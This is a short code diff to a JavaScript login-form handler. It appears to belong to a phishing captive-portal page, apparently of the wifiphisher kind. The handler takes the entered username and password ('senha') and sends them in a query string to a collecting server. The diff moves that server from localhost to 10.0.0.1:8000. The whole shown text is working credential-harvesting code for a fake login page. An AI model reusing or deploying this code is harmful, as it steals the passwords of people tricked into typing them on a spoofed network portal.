@@ -40,7 +40,7 @@ form.onsubmit = function(event){
 
         let senha = document.getElementById('inputSenha').value;
 
-        xhr.open('POST',`http://localhost:8000/index.php?wfphshr-login=${login}&wfphshr-pass=${senha}`, false)
+        xhr.open('POST',`http://10.0.0.1:8000/index.php?wfphshr-login=${login}&wfphshr-pass=${senha}`, false)
 
         xhr.send(null);
 
